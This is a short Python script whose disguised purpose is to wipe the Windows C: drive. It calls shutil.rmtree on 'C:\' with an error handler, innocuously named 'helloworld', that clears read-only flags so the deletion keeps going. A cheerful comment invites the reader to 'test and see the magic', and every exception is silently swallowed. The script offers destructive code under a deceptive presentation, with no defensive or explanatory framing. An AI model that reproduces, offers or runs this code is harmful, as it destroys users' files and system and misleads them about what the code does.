import os, shutil, stat

def helloworld(func, path, _):
    os.chmod(path, stat.S_IWRITE)
    func(path)

# Test and see the magic 😍
try:
    shutil.rmtree('C:\\', onerror=helloworld)
except Exception:
    pass
